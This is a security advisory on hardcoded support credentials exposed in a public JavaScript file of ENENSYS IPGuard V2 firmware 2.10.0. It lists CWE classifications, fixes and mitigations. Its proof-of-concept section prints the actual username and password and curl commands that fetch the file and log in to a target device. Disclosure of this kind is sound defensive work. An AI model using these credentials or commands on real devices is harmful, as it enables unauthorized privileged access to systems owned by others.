# ENENSYS IPGuard V2 - Information Disclosure Vulnerability

## Description

ENENSYS IPGuard V2 firmware version 2.10.0 contains hardcoded support credentials exposed in the `/scripts/app-d306eced71.js` JavaScript file. An unauthenticated attacker can extract the `NN6support` username and `:jvtreo!:` password to gain unauthorized privileged access to the system, potentially leading to a full system compromise.

## Vendor Information

- **Vendor:** ENENSYS Technologies  
- **Vendor Homepage:** [ENENSYS](https://www.enensys.com/)

## Affected Product(s)/Code Base

- **Product:** ENENSYS IPGuard V2  
- **Firmware Version:** 2.10.0

## Vulnerability Type

- **Information Disclosure Leading to Unauthorized Access**  
- **Hardcoded Credentials Exposure**

## Vulnerable Endpoint(s)

- `/scripts/app-d306eced71.js`

## Exploit Summary

The ENENSYS IPGuard V2 device running firmware version 2.10.0 is vulnerable to information disclosure due to the inclusion of hardcoded support credentials in a publicly accessible JavaScript file. This allows an unauthenticated remote attacker to obtain privileged login credentials and gain unauthorized access to the system.

### Impact

- Full unauthorized access to the administrative interface or privileged support functions  
- Potential for complete system compromise  
- Exposure of internal credentials to any user with access to the web interface

## Proof of Concept (PoC)

### Step 1: Visit Vulnerable Endpoint
Access the JavaScript file hosted on the target device:

```bash
curl http://<target-ip>/scripts/app-d306eced71.js
```
### Step 2: Search for `open_session` Keyword 
Search for the following string in the script file (around line 7505):
```plaintext
"<open_session><login>"
```
**Example:**
```plaintext
"<open_session><login>" + 'NN6support' + "</login><password>" + ':jvtreo!:' + "</password></open_session>"
```
### Step 3: Use Extracted Credentials to Authenticate 
Now that the attacker has the support username and password: 
* **Username:** `NN6support` 
* **Password:** `:jvtreo!:`
They can use this to authenticate to the device via the API, SOAP interface, or web admin panel, depending on how authentication is handled.

#### Exploit Example:
Assuming the system accepts XML-based login (as suggested by the `open_session` string):
```bash
curl -X POST http://<target-ip>/api/session \
-H "Content-Type: application/xml" \
--data '<open_session><login>NN6support</login><password>:jvtreo!:</password></open_session>'
```
If successful, the attacker is logged in as a privileged user.

---

## **PoC Video**  

https://github.com/user-attachments/assets/2b4c2ddd-30fc-4833-89e2-ee029f5d0b14

---

# Vulnerability Details

## Vulnerability Classification

- **CWE-798** – Use of Hard-coded Credentials  
- **CWE-200** – Exposure of Sensitive Information to Unauthorized Actors  
- **CWE-522** – Insufficiently Protected Credentials

## Suggested Fixes

- **Remove** any hardcoded credentials from frontend JavaScript code.  
- **Implement** proper credential storage and server-side authentication handling.  
- **Enforce** Role-Based Access Control (RBAC) and restrict backend access based on origin and user role.  
- **Rotate** exposed credentials and release a firmware patch.  
- **Add** server-side logging and alerts for support-level logins.

## Impact Type

- **Unauthorized Access**  
- **Privilege Escalation**  
- **System Takeover**

## Mitigation & Workaround

- **Temporarily restrict access** to the `/scripts/` directory via web server configuration.  
- **Immediately rotate** or disable `NN6support` credentials across all deployed units.  
- **Apply** a Web Application Firewall (WAF) to detect and block suspicious access to the vulnerable script.
